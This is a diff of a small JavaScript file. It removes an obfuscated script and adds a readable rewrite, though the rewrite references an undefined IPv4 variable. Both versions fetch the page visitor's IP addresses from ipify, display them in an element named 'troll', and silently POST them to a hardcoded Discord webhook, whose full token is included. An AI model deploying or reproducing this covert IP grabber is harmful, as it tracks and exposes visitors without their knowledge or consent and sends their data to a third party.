@@ -1,1 +1,22 @@
-const _0x490157=_0x2621;function _0x2621(_0x1279f9,_0x35d0ab){const _0x4a4b21=_0x4a4b();return _0x2621=function(_0x26213a,_0x526a03){_0x26213a=_0x26213a-0x79;let _0x40bb1e=_0x4a4b21[_0x26213a];return _0x40bb1e;},_0x2621(_0x1279f9,_0x35d0ab);}function _0x4a4b(){const _0x48b5e5=['4QTAOTt','innerHTML','https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ','7397131QrblbS','2257784ICTzOd','2WSxcWc','318562yPKiSm','2171082MMNFox','2055291DqDDPO','4096345taWlVn','then','IPv4:\x20','8091576Anknld','json','<br>IPv6:\x20','https://api6.ipify.org/?format=json','POST','https://api.ipify.org/?format=json','application/json','getElementById'];_0x4a4b=function(){return _0x48b5e5;};return _0x4a4b();}(function(_0x40897d,_0x37d25d){const _0x2052c4=_0x2621,_0x1a9f60=_0x40897d();while(!![]){try{const _0x42b640=parseInt(_0x2052c4(0x88))/0x1*(parseInt(_0x2052c4(0x89))/0x2)+-parseInt(_0x2052c4(0x8b))/0x3*(parseInt(_0x2052c4(0x83))/0x4)+parseInt(_0x2052c4(0x8c))/0x5+-parseInt(_0x2052c4(0x8a))/0x6+parseInt(_0x2052c4(0x86))/0x7+parseInt(_0x2052c4(0x87))/0x8+-parseInt(_0x2052c4(0x7b))/0x9;if(_0x42b640===_0x37d25d)break;else _0x1a9f60['push'](_0x1a9f60['shift']());}catch(_0x290dcf){_0x1a9f60['push'](_0x1a9f60['shift']());}}}(_0x4a4b,0x8195b),fetch(_0x490157(0x80))['then'](_0x25f868=>_0x25f868[_0x490157(0x7c)]())['then'](_0x13a086=>{const _0x37e16b=_0x490157,_0x2fbc9e=_0x13a086['ip'];fetch(_0x37e16b(0x7e))['then'](_0x16f8e4=>_0x16f8e4[_0x37e16b(0x7c)]())[_0x37e16b(0x79)](_0x623e26=>{const _0x4a845c=_0x37e16b,_0x114087=_0x623e26['ip'];document[_0x4a845c(0x82)]('troll')[_0x4a845c(0x84)]=_0x4a845c(0x7a)+_0x2fbc9e+_0x4a845c(0x7d)+_0x114087;const _0x1c3ad3=_0x4a845c(0x85),_0x319b46='IPv4:\x20'+_0x2fbc9e+'\x0aIPv6:\x20'+_0x114087;fetch(_0x1c3ad3,{'method':_0x4a845c(0x7f),'headers':{'Content-Type':_0x4a845c(0x81)},'body':JSON['stringify']({'content':_0x319b46})});});}));
+fetch('https://api6.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const IPv6 = data.ip;
+
+    
+    document.getElementById('troll').innerHTML = "IPv4: " + IPv4 + "<br>IPv6: " + IPv6;
+
+    
+    const webhookUrl = 'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ';
+    const message = `IPv4: ${IPv4}\nIPv6: ${IPv6}`;
+    
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: message
+      })
+    });
+  });
